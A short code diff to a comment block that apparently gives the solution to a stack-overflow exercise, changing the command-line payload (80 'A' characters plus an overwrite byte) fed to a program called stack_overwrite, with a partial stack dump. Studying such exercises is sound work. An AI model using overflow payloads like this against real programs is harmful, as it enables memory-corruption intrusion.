@@ -1,6 +1,6 @@
 /*
 ** Solution
-** ./stack_overwrite $( perl -e 'print "A"x80 . "\x00\x00\x00\x01" ' )
+** ./stack_overwrite $( perl -e ' print "A"x80 . "\x01" ' )
 **
 ** Stack dump:
 ** 0xffffd5f8: 0x000015d1
